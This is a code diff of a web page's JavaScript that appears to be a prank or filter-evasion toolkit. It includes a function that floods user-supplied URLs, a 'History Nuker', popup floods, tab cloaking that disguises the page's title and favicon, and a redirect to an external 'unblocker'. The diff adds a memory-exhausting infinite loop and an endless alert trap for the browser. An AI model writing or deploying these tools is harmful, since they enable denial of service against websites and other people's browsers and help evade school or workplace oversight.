@@ -157,7 +157,6 @@ function backToTerminal() {
   document.getElementById('terminal').classList.remove('hidden');
 }
 
-// Attack functions
 let floodInterval;
 function startAttack() {
   const urls = document.getElementById('attackUrls').value.split(',').map(u => u.trim()).filter(Boolean);
@@ -188,7 +187,6 @@ function stopAttack() {
   clearInterval(floodInterval);
 }
 
-// History Nuker
 let nukeInterval;
 function startNuke() {
   nukeInterval = setInterval(() => {
@@ -211,7 +209,6 @@ function stopNuke() {
   clearInterval(nukeInterval);
 }
 
-// Popup flood for denied access
 function triggerPopupFlood() {
   setInterval(() => {
     for (let i = 0; i < 50; i++) {
@@ -246,7 +243,10 @@ function applyCloak() {
     case 'blank': title = 'New Tab'; break;
     case 'custom': title = custom; break;
   }
+
   document.title = title;
+  document.querySelectorAll('link[rel="icon"]').forEach(el => el.remove());
+
   if (favicon) {
     let link = document.createElement('link');
     link.rel = 'icon';
@@ -255,12 +255,29 @@ function applyCloak() {
   }
 }
 
-// Unblocker
 function openUnblocker() {
   window.location.href = "https://this-gold.vercel.app/";
 }
 
-// Extreme Tools
 function popupStorm() {
   for (let i = 0; i < 50; i++) {
-    window.open('about:blank', '_blank
+    window.open('about:blank', '_blank');
+  }
+}
+
+function memoryBloater() {
+  const arr = [];
+  while (true) {
+    arr.push(new Array(1000000).fill("X"));
+  }
+}
+
+function trapBrowser() {
+  while (true) {
+    alert("YOU ARE TRAPPED IN SIGMA MODE");
+  }
+}
+</script>
+
+</body>
+</html>
